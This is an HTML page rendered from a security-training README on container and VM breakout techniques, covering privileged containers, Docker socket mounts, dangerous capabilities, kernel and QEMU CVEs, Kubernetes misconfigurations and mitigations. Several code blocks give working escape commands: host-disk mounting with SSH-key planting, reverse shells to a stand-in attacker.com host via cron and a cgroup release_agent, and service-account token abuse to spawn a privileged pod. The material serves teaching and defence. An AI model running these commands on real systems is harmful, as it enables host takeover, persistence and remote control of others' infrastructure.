@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Escape Techniques — Container and VM Breakout</title>
+
+  <!-- Mermaid JS (CDN). Render lazily so very large pages stay scrollable. -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: false, theme: 'neutral' });
+
+    function renderMermaidBlock(el) {
+      if (el.dataset.mermaidState) return;
+      el.dataset.mermaidState = 'rendering';
+      mermaid.run({ nodes: [el] })
+        .then(function () {
+          el.dataset.mermaidState = 'rendered';
+        })
+        .catch(function (err) {
+          el.dataset.mermaidState = 'error';
+          el.classList.add('mermaid-error');
+          console.error('Mermaid render failed:', err);
+        });
+    }
+
+    function initMermaidLazyRender() {
+      var blocks = Array.prototype.slice.call(document.querySelectorAll('.mermaid'));
+      if (!blocks.length) return;
+
+      if ('IntersectionObserver' in window) {
+        var observer = new IntersectionObserver(function (entries) {
+          entries.forEach(function (entry) {
+            if (!entry.isIntersecting) return;
+            observer.unobserve(entry.target);
+            renderMermaidBlock(entry.target);
+          });
+        }, { rootMargin: '800px 0px', threshold: 0.01 });
+
+        blocks.forEach(function (block) {
+          observer.observe(block);
+        });
+      } else {
+        var index = 0;
+        function renderBatch() {
+          blocks.slice(index, index + 8).forEach(renderMermaidBlock);
+          index += 8;
+          if (index < blocks.length) window.setTimeout(renderBatch, 50);
+        }
+        renderBatch();
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initMermaidLazyRender);
+    } else {
+      initMermaidLazyRender();
+    }
+  </script>
+
+  <!-- Syntax highlighting (optional, no build step required) -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    *  { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      line-height: 1.7;
+      color: #24292f;
+      background: #fff;
+    }
+
+    /* Typography */
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      font-weight: 600;
+    }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    a { color: #0969da; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Code */
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    code {
+      background: #f6f8fa;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.9em;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      border-radius: 0;
+    }
+
+    /* Tables */
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 16px 0;
+      font-size: 0.92em;
+    }
+    th, td {
+      border: 1px solid #d0d7de;
+      padding: 8px 14px;
+      text-align: left;
+      vertical-align: top;
+    }
+    th {
+      background: #f6f8fa;
+      font-weight: 600;
+    }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Blockquotes */
+    blockquote {
+      border-left: 4px solid #d0d7de;
+      margin: 0 0 16px 0;
+      padding: 8px 16px;
+      color: #57606a;
+      background: #f6f8fa;
+      border-radius: 0 6px 6px 0;
+    }
+
+    /* Mermaid diagrams */
+    .mermaid {
+      background: #fafbfc;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      text-align: center;
+    }
+    pre.mermaid {
+      white-space: pre;
+    }
+    .mermaid svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .mermaid[data-mermaid-state="rendering"] {
+      min-height: 140px;
+    }
+    .mermaid-error {
+      text-align: left;
+      color: #57606a;
+    }
+
+    /* Images */
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 14px 0;
+      border: 1px solid #d0d7de;
+      background: #fff;
+      cursor: zoom-in;
+      display: block;
+    }
+
+    /* ── Image zoom overlay ─────────────────────────────── */
+    #img-zoom-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.82);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    #img-zoom-overlay.active { display: flex; }
+    #img-zoom-wrap {
+      position: relative;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+    }
+    #img-zoom-wrap.dragging { cursor: grabbing; }
+    #img-zoom-el {
+      max-width: none;
+      max-height: none;
+      border: none;
+      margin: 0;
+      border-radius: 4px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+      transform-origin: center center;
+      user-select: none;
+      pointer-events: none;
+    }
+    #img-zoom-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: rgba(20,20,20,0.88);
+      padding: 7px 18px;
+      border-radius: 24px;
+      z-index: 10000;
+    }
+    #img-zoom-controls button {
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.1em;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+    #img-zoom-controls button:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-level {
+      color: #ccc;
+      font-size: 0.82em;
+      min-width: 46px;
+      text-align: center;
+      font-family: monospace;
+    }
+    #img-zoom-close {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.3em;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: background 0.15s;
+    }
+    #img-zoom-close:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-hint {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: rgba(200,200,200,0.7);
+      font-size: 0.76em;
+      font-family: -apple-system, sans-serif;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    /* Breadcrumb / path */
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 24px;
+      font-family: monospace;
+    }
+
+    /* Horizontal rule */
+    hr { border: none; border-top: 2px solid #d0d7de; margin: 24px 0; }
+  </style>
+</head>
+<body>
+  <p class="file-path">Source: infra\Virtualization\Escape-Techniques\README.md</p>
+<h1 id="escape-techniques-container-and-vm-breakout">Escape Techniques — Container and VM Breakout</h1>
+<p><strong>Category:</strong> Infrastructure Security — Isolation Bypass<br />
+<strong>MITRE ATT&amp;CK:</strong> T1611 (Escape to Host), T1610 (Deploy Container)<br />
+<strong>Applies To:</strong> Docker, Kubernetes, runc, containerd, KVM, VMware ESXi, any multi-tenant compute environment</p>
+<h2 id="overview">Overview</h2>
+<p>Escape techniques refer to methods by which an attacker who has code execution inside a container or VM breaks out of the isolation boundary to access the host OS, the hypervisor, or other co-tenants. Container escapes are significantly more common than VM escapes because containers share the host kernel — any kernel vulnerability or misconfiguration that grants elevated privileges can lead directly to host access.</p>
+<p>At Google scale, container escapes represent a catastrophic failure of multi-tenancy. GKE uses gVisor (a Go-based kernel sandbox) and Container-Optimized OS (a minimal, read-only, hardened OS) specifically to increase the cost of container escape. Understanding the full range of escape techniques — from misconfiguration exploits to kernel CVEs — is essential for both building secure container infrastructure and for red-teaming it.</p>
+<h2 id="how-escapes-work">How Escapes Work</h2>
+<h3 id="the-root-cause-shared-kernel-surface">The Root Cause: Shared Kernel Surface</h3>
+<pre class="mermaid">
+flowchart TD
+    A[Attacker code in container] --> B{Escape path available?}
+    B --> C[Kernel CVE in shared host kernel]
+    B --> D[Privileged container / dangerous capabilities]
+    B --> E[Mounted host path escaping to host fs]
+    B --> F[Writable Docker socket or CRI socket]
+    B --> G[K8s misconfiguration - hostPID or hostNetwork]
+    B --> H[VM escape via hypervisor device emulation bug]
+    C --> I[Host code execution as root]
+    D --> I
+    E --> I
+    F --> I
+    G --> I
+    H --> J[Hypervisor code execution]
+</pre>
+<hr />
+<h2 id="container-escape-techniques">Container Escape Techniques</h2>
+<h3 id="1-privileged-container-privileged-privileged-true">1. Privileged Container (<code>--privileged</code> / <code>privileged: true</code>)</h3>
+<p>A privileged container has all Linux capabilities and direct access to host devices. It can:<br />
+- Access <code>/dev</code> — mount the host filesystem<br />
+- Load kernel modules<br />
+- Manipulate host network interfaces<br />
+- Interact with cgroups directly</p>
+<pre><code class="language-bash"># Inside a privileged container, escape to host:
+# Find the host root filesystem device
+ls /dev/sd*   # or /dev/xvda, /dev/vda
+
+# Mount host root filsystem
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+
+# Write an SSH key to host root's authorized_keys
+mkdir -p /mnt/host/root/.ssh
+echo &quot;ssh-ed25519 AAAA...attacker_key&quot; &gt;&gt; /mnt/host/root/.ssh/authorized_keys
+
+# Or: write a cron job that runs a reverse shell
+echo &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&quot; &gt;&gt; /mnt/host/etc/cron.d/backdoor
+</code></pre>
+<h3 id="2-docker-socket-mount-varrundockersock">2. Docker Socket Mount (<code>/var/run/docker.sock</code>)</h3>
+<p>If the container has access to the Docker socket, it can control the Docker daemon directly — including creating new privileged containers with host mounts.</p>
+<pre><code class="language-bash"># Inside container with Docker socket access
+docker run -v /:/host --rm -it alpine chroot /host bash
+# Now running as root on the host filesystem
+</code></pre>
+<p>This is a complete host escape. The Docker socket must never be mounted in an untrusted container.</p>
+<h3 id="3-dangerous-linux-capabilities">3. Dangerous Linux Capabilities</h3>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>Escape Vector</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CAP_SYS_ADMIN</code></td>
+<td>Mount filesystems, manipulate namespaces, load kernel modules → near-equivalent to privileged</td>
+</tr>
+<tr>
+<td><code>CAP_NET_ADMIN</code></td>
+<td>Modify routing tables, intercept network traffic</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_PTRACE</code></td>
+<td>ptrace any process; can attach to host processes if PID namespace is shared</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_MODULE</code></td>
+<td>Load kernel modules directly → kernel backdoor</td>
+</tr>
+<tr>
+<td><code>CAP_DAC_READ_SEARCH</code></td>
+<td>Read any file regardless of permissions → read host secrets</td>
+</tr>
+<tr>
+<td><code>CAP_SETUID</code> / <code>CAP_SETGID</code></td>
+<td>Change UID to root; manipulate setuid binaries</td>
+</tr>
+</tbody>
+</table>
+<p><strong>CAP_SYS_ADMIN escape technique:</strong></p>
+<pre><code class="language-bash"># Mount cgroup filesystem to create a release_agent escape
+mkdir /tmp/cgroup &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgroup
+mkdir /tmp/cgroup/x
+echo 1 &gt; /tmp/cgroup/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo &quot;$host_path/cmd&quot; &gt; /tmp/cgroup/release_agent
+echo '#!/bin/sh' &gt; /cmd
+echo &quot;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&quot; &gt;&gt; /cmd &amp;&amp; chmod a+x /cmd
+echo 0 &gt; /tmp/cgroup/x/cgroup.procs  # triggers release_agent as root on host
+</code></pre>
+<h3 id="4-kernel-cve-exploitation">4. Kernel CVE Exploitation</h3>
+<p>Since containers share the host kernel, any kernel privilege escalation CVE exploitable from an unprivileged process can be used to escape. Key historical examples:</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Description</th>
+<th>Affected</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2022-0847 (Dirty Pipe)</td>
+<td>Write to read-only files via pipe splice; overwrite arbitrary host files from container</td>
+<td>Linux 5.8–5.16</td>
+</tr>
+<tr>
+<td>CVE-2016-5195 (Dirty COW)</td>
+<td>Race condition in copy-on-write; write to read-only memory-mapped files</td>
+<td>Linux &lt; 4.8.3</td>
+</tr>
+<tr>
+<td>CVE-2019-5736 (runc)</td>
+<td>runc binary overwrite via <code>/proc/self/exe</code> during container exec</td>
+<td>runC, Docker, K8s</td>
+</tr>
+<tr>
+<td>CVE-2020-15257 (Containerd)</td>
+<td>UNIX socket in shared network namespace allows escape from container</td>
+<td>containerd &lt; 1.3.9</td>
+</tr>
+<tr>
+<td>CVE-2021-30465 (runc)</td>
+<td>TOCTOU race during mount; symlink to escape rootfs</td>
+<td>runC &lt; 1.0.0-rc95</td>
+</tr>
+<tr>
+<td>CVE-2022-23648</td>
+<td>containerd image extraction; path traversal to write host files</td>
+<td>containerd &lt; 1.6.1</td>
+</tr>
+</tbody>
+</table>
+<h3 id="5-kubernetes-specific-misconfigurations">5. Kubernetes-Specific Misconfigurations</h3>
+<table>
+<thead>
+<tr>
+<th>Misconfiguration</th>
+<th>Escape Vector</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>hostPID: true</code></td>
+<td>Share host PID namespace; attach to host processes via ptrace</td>
+</tr>
+<tr>
+<td><code>hostNetwork: true</code></td>
+<td>Access host network; reach node metadata service directly</td>
+</tr>
+<tr>
+<td><code>hostPath</code> volume mount</td>
+<td>Mount <code>/</code>, <code>/etc</code>, <code>/var/run/docker.sock</code>, <code>/proc</code> directly</td>
+</tr>
+<tr>
+<td>Over-privileged service account</td>
+<td>SA token can create pods with <code>privileged: true</code></td>
+</tr>
+<tr>
+<td>No PodSecurityAdmission</td>
+<td>Any pod manifest can request privileged capabilities</td>
+</tr>
+<tr>
+<td>Unrestricted imagePullPolicy</td>
+<td>Pull from untrusted registries with malicious images</td>
+</tr>
+</tbody>
+</table>
+<p><strong>K8s SA token lateral movement to escape:</strong></p>
+<pre><code class="language-bash"># Inside a compromised pod
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+# Call API server to create a privileged pod
+curl -k -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods \
+  -d '{&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:{&quot;name&quot;:&quot;escape&quot;},&quot;spec&quot;:{&quot;hostPID&quot;:true,&quot;hostNetwork&quot;:true,&quot;containers&quot;:[{&quot;name&quot;:&quot;c&quot;,&quot;image&quot;:&quot;alpine&quot;,&quot;securityContext&quot;:{&quot;privileged&quot;:true},&quot;volumeMounts&quot;:[{&quot;name&quot;:&quot;host&quot;,&quot;mountPath&quot;:&quot;/host&quot;}]}],&quot;volumes&quot;:[{&quot;name&quot;:&quot;host&quot;,&quot;hostPath&quot;:{&quot;path&quot;:&quot;/&quot;}}]}}'
+</code></pre>
+<hr />
+<h2 id="vm-escape-techniques">VM Escape Techniques</h2>
+<h3 id="1-hypervisor-device-emulation-vulnerabilities-qemu">1. Hypervisor Device Emulation Vulnerabilities (QEMU)</h3>
+<p>The primary VM escape vector. QEMU emulates hardware devices (NIC, disk, USB) for VMs:</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Component</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2015-3456 (VENOM)</td>
+<td>QEMU FDC (floppy controller)</td>
+<td>Heap overflow in floppy controller emulation; code exec in hypervisor</td>
+</tr>
+<tr>
+<td>CVE-2019-14378</td>
+<td>QEMU SLiRP</td>
+<td>Heap overflow in IPv6 packet reassembly</td>
+</tr>
+<tr>
+<td>CVE-2021-3930</td>
+<td>QEMU SCSI</td>
+<td>Stack overflow in SCSI device emulation</td>
+</tr>
+<tr>
+<td>CVE-2022-26353</td>
+<td>QEMU virtio-net</td>
+<td>Memory disclosure in virtio-net Rx path</td>
+</tr>
+</tbody>
+</table>
+<p><strong>VENOM (CVE-2015-3456) — the canonical VM escape:</strong><br />
+Guest OS sends crafted floppy controller commands → triggers heap overflow in QEMU floppy emulation code running in hypervisor context → attacker writes shellcode to hypervisor heap → code execution as QEMU process on host.</p>
+<h3 id="2-shared-memory-mmio-abuse">2. Shared Memory / MMIO Abuse</h3>
+<p>VM maps a Memory-Mapped I/O region. Bugs in the hypervisor's MMIO handler allow a guest to corrupt hypervisor memory via crafted read/write sequences.</p>
+<h3 id="3-virtual-gpu-and-passthrough-bugs">3. Virtual GPU and Passthrough Bugs</h3>
+<p>vGPU drivers in the guest can trigger bugs in kernel-level GPU virtualization code (NVIDIA vGPU, VGT+), leading to privilege escalation on the host.</p>
+<h2 id="mitigation-controls">Mitigation Controls</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Threat</th>
+<th>Mitigation</th>
+<th>Layer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Privileged container</td>
+<td>PodSecurityAdmission <code>Restricted</code>; deny <code>privileged: true</code> in admission controller</td>
+<td>K8s admission</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Dangerous capabilities</td>
+<td>Drop all caps (<code>drop: [ALL]</code>); add only needed (e.g., NET_BIND_SERVICE)</td>
+<td>Pod securityContext</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Docker socket access</td>
+<td>Never mount <code>/var/run/docker.sock</code> in containers; use socket proxies if needed</td>
+<td>Container config</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Kernel CVE exploitation</td>
+<td>Use gVisor — intercepting syscalls with a separate kernel; keep host kernel patched</td>
+<td>Container runtime</td>
+</tr>
+<tr>
+<td>5</td>
+<td>hostPath mounts</td>
+<td>Prohibit arbitrary hostPath mounts; use ReadOnlyRootFilesystem</td>
+<td>Admission + securityContext</td>
+</tr>
+<tr>
+<td>6</td>
+<td>hostPID / hostNetwork</td>
+<td>Deny in admission policy except for DaemonSets with specific justification</td>
+<td>K8s admission</td>
+</tr>
+<tr>
+<td>7</td>
+<td>VM escape via QEMU</td>
+<td>Isolate QEMU in a sandbox (seccomp, AppArmor, SELinux); update QEMU regularly</td>
+<td>Hypervisor config</td>
+</tr>
+<tr>
+<td>8</td>
+<td>K8s SA token abuse</td>
+<td>Disable automounting; use Workload Identity instead</td>
+<td>Pod spec / IAM</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Image supply chain</td>
+<td>Binary Authorization; sign and verify all images with Cosign/Sigstore</td>
+<td>Build pipeline</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Cgroup release_agent</td>
+<td>Use cgroup v2; Linux 5.14+ restricts release_agent in user namespaces</td>
+<td>Kernel version</td>
+</tr>
+</tbody>
+</table>
+<h3 id="top-3-critical-mitigations">Top 3 Critical Mitigations</h3>
+<ol>
+<li><strong>PodSecurityAdmission <code>Restricted</code> profile</strong> — enforces <code>runAsNonRoot</code>, drops all capabilities, disables privileged containers, requires read-only root filesystem. This single control eliminates the most common container escape paths.</li>
+<li><strong>gVisor as container runtime</strong> — gVisor intercepts all syscalls from the container before they reach the host kernel. Even if a container process has a kernel exploit payload, gVisor's separate kernel (Gofer + Sentry) means the host kernel never sees the attack.</li>
+<li><strong>Patch kernel and container runtime urgently</strong> — Dirty Pipe, Dirty COW, runc CVEs are exploitable within hours of disclosure. Automated patching pipelines with rapid rollout on container hosts must treat kernel CVEs as P0 incidents.</li>
+</ol>
+<h2 id="practice-questions">Practice Questions</h2>
+<ol>
+<li>What is the fundamental reason container escapes are more common than VM escapes?</li>
+<li>Walk through how a privileged container can escape to the host. What steps would an attacker take?</li>
+<li>Explain the CVE-2019-5736 (runc) vulnerability. Why is overwriting the runc binary possible from within the container?</li>
+<li>What is the cgroup release_agent escape and how does it work?</li>
+<li>How does gVisor prevent container escapes and what are its performance trade-offs?</li>
+<li>A deployment requires the container to run as root. What compensating controls would you require?</li>
+<li>How would you detect a container escape attempt in real-time using eBPF or Falco?</li>
+<li>What is the VENOM vulnerability and why is device emulation code such a high-risk attack surface?</li>
+<li>Walk through how a Kubernetes service account token can be used to escape from a compromised pod to cluster-admin.</li>
+<li>How do you implement a defense-in-depth strategy for container workloads when you must support third-party container images?</li>
+</ol>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Container escapes are the primary multi-tenant security risk in Kubernetes/container environments.</li>
+<li>Privileged containers and Docker socket access are essentially full host access — never allow them in production.</li>
+<li>The cgroup release_agent exploit is a classic kernel-level escape that works in older environments without proper seccomp/AppArmor.</li>
+<li>VM escapes require hypervisor-level bugs (QEMU CVEs) and are rarer, but devastating when they occur.</li>
+<li>gVisor adds a second isolation layer below containers that prevents most kernel exploitation paths.</li>
+<li>Kubernetes misconfigurations (hostPID, hostPath, over-privileged service accounts) are more common escape paths than kernel CVEs in practice.</li>
+</ul>
+
+  <!-- ── Image zoom overlay ───────────────────────────── -->
+  <div id="img-zoom-overlay">
+    <div id="img-zoom-wrap">
+      <img id="img-zoom-el" src="" alt="">
+    </div>
+    <div id="img-zoom-controls">
+      <button id="zoom-out-btn"  title="Zoom out (scroll down / minus)">&#8722;</button>
+      <span   id="img-zoom-level">100%</span>
+      <button id="zoom-in-btn"   title="Zoom in (scroll up / plus)">&#43;</button>
+      <button id="zoom-reset-btn" title="Reset (key: 0)">&#8635;</button>
+    </div>
+    <button id="img-zoom-close" title="Close (Esc)">&#10005;</button>
+    <span   id="img-zoom-hint">Scroll to zoom &nbsp;·&nbsp; Drag to pan &nbsp;·&nbsp; Esc to close</span>
+  </div>
+
+  <script>
+  (function () {
+    var overlay   = document.getElementById('img-zoom-overlay');
+    var wrap      = document.getElementById('img-zoom-wrap');
+    var zoomEl    = document.getElementById('img-zoom-el');
+    var levelEl   = document.getElementById('img-zoom-level');
+    var closeBtn  = document.getElementById('img-zoom-close');
+    var btnIn     = document.getElementById('zoom-in-btn');
+    var btnOut    = document.getElementById('zoom-out-btn');
+    var btnReset  = document.getElementById('zoom-reset-btn');
+
+    var scale = 1, tx = 0, ty = 0;
+    var MIN = 0.15, MAX = 12, STEP = 0.2;
+
+    function applyTransform() {
+      zoomEl.style.transform =
+        'translate(' + tx + 'px,' + ty + 'px) scale(' + scale + ')';
+      levelEl.textContent = Math.round(scale * 100) + '%';
+    }
+
+    function openOverlay(src, alt) {
+      zoomEl.src = src;
+      zoomEl.alt = alt || '';
+      scale = 1; tx = 0; ty = 0;
+      applyTransform();
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeOverlay() {
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+      zoomEl.src = '';
+    }
+
+    // Wire click on every page image.
+    // Uses closest('a') so anchor wrappers at ANY ancestor depth are caught.
+    // Standalone images (no ancestor <a>) get the listener on the <img> itself.
+    document.querySelectorAll('img:not(#img-zoom-el)').forEach(function (img) {
+      var anchor = img.closest('a');
+      if (anchor) {
+        anchor.style.cursor = 'zoom-in';
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      } else {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', function (e) {
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      }
+    });
+
+    closeBtn.addEventListener('click', closeOverlay);
+    overlay.addEventListener('click', function (e) {
+      if (e.target === overlay || e.target === wrap) closeOverlay();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (!overlay.classList.contains('active')) return;
+      if (e.key === 'Escape') { closeOverlay(); return; }
+      if (e.key === '+' || e.key === '=') { scale = Math.min(MAX, scale + STEP); applyTransform(); }
+      if (e.key === '-')                  { scale = Math.max(MIN, scale - STEP); applyTransform(); }
+      if (e.key === '0')                  { scale = 1; tx = 0; ty = 0; applyTransform(); }
+    });
+
+    btnIn.addEventListener('click',    function () { scale = Math.min(MAX, scale + STEP); applyTransform(); });
+    btnOut.addEventListener('click',   function () { scale = Math.max(MIN, scale - STEP); applyTransform(); });
+    btnReset.addEventListener('click', function () { scale = 1; tx = 0; ty = 0; applyTransform(); });
+
+    // Scroll-wheel zoom (zoom towards cursor)
+    wrap.addEventListener('wheel', function (e) {
+      e.preventDefault();
+      var rect  = wrap.getBoundingClientRect();
+      var cx    = e.clientX - rect.left  - rect.width  / 2;
+      var cy    = e.clientY - rect.top   - rect.height / 2;
+      var delta = e.deltaY < 0 ? STEP : -STEP;
+      var newScale = Math.min(MAX, Math.max(MIN, scale + delta));
+      var ratio    = newScale / scale;
+      tx = cx + ratio * (tx - cx);
+      ty = cy + ratio * (ty - cy);
+      scale = newScale;
+      applyTransform();
+    }, { passive: false });
+
+    // Mouse drag to pan
+    var dragging = false, dsx = 0, dsy = 0, stx = 0, sty = 0;
+    wrap.addEventListener('mousedown', function (e) {
+      dragging = true; wrap.classList.add('dragging');
+      dsx = e.clientX; dsy = e.clientY;
+      stx = tx;        sty = ty;
+      e.preventDefault();
+    });
+    document.addEventListener('mousemove', function (e) {
+      if (!dragging) return;
+      tx = stx + (e.clientX - dsx);
+      ty = sty + (e.clientY - dsy);
+      applyTransform();
+    });
+    document.addEventListener('mouseup', function () {
+      if (dragging) { dragging = false; wrap.classList.remove('dragging'); }
+    });
+
+    // Touch: pinch-to-zoom + single-finger pan
+    var lastDist = 0, pinchStartScale = 1;
+    wrap.addEventListener('touchstart', function (e) {
+      if (e.touches.length === 2) {
+        var dx = e.touches[0].clientX - e.touches[1].clientX;
+        var dy = e.touches[0].clientY - e.touches[1].clientY;
+        lastDist = Math.hypot(dx, dy);
+        pinchStartScale = scale;
+      } else if (e.touches.length === 1) {
+        dragging = true;
+        dsx = e.touches[0].clientX; dsy = e.touches[0].clientY;
+        stx = tx; sty = ty;
+      }
+    }, { passive: true });
+    wrap.addEventListener('touchmove', function (e) {
+      if (e.touches.length === 2) {
+        e.preventDefault();
+        var dx   = e.touches[0].clientX - e.touches[1].clientX;
+        var dy   = e.touches[0].clientY - e.touches[1].clientY;
+        var dist = Math.hypot(dx, dy);
+        scale = Math.min(MAX, Math.max(MIN, pinchStartScale * (dist / lastDist)));
+        applyTransform();
+      } else if (e.touches.length === 1 && dragging) {
+        tx = stx + (e.touches[0].clientX - dsx);
+        ty = sty + (e.touches[0].clientY - dsy);
+        applyTransform();
+      }
+    }, { passive: false });
+    wrap.addEventListener('touchend', function () { dragging = false; });
+  })();
+  </script>
+</body>
+</html>
